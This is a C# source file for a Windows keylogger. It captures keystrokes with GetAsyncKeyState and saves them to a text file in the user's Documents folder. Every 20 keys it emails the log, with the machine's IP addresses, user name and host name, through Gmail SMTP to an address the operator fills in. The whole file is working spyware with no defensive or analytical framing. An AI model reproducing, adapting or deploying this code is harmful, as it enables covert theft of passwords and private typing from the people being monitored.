using System;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.ExceptionServices;
using System.Runtime.InteropServices;
using System.Threading;

namespace newKeylog
{
    internal class Program
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        static long numberOfKeystrokes = 0;

        static void Main(string[] args)
        {
            String filepath= Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            if (!Directory.Exists(filepath)) 
            {
                Directory.CreateDirectory(filepath);
            }
           
            string path = (filepath + @"\keystrokes.txt");
            if (!File.Exists(path)) 
            {
                using (StreamWriter sw = File.CreateText(path))
                {

                }
            }

            while (true)
            {
                Thread.Sleep(5);
                for (int i = 32; i < 127; i++) 
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState == 32768)  
                    {
                        Console.Write((char) i+ ",");
                        using (StreamWriter sw = File.AppendText(path))
                        {
                            sw.Write((char) i);
                        }
                        numberOfKeystrokes++;
                        if (numberOfKeystrokes % 20 == 0)//its depend how many letter u want
                        {
                            SendMessage();
                        }
                    }
                }
            }           

        }

        static void SendMessage()
        {
            String folderName = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            string filePath = folderName + @"\keystrokes.txt";
            String logContents = File.ReadAllText(filePath);
            string emailBody = "";
            DateTime now = DateTime.Now;
            string subject = "Message from keylogger";
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var address in host.AddressList)
            {
                emailBody += "address: " + address;
            }
            emailBody += "\n User: " + Environment.UserDomainName + "\\" + Environment.UserName;
            emailBody += "\nhost" + host;
            emailBody += "\ntime" + now.ToString();
            emailBody += logContents;
            SmtpClient client = new SmtpClient("smtp.gmail.com" , 587);
            MailMessage mailMessage = new MailMessage();
            mailMessage.From = new MailAddress("");//put ur gmail here
            mailMessage.To.Add("");//same again cuz u just send it to ur selves
            mailMessage.Subject = subject;
            client.UseDefaultCredentials = false;
            client.EnableSsl = true;
            client.Credentials = new System.Net.NetworkCredential("", ""); // first is ur email secons is password
            mailMessage.Body = emailBody;
            client.Send(mailMessage);

        }
    }
}
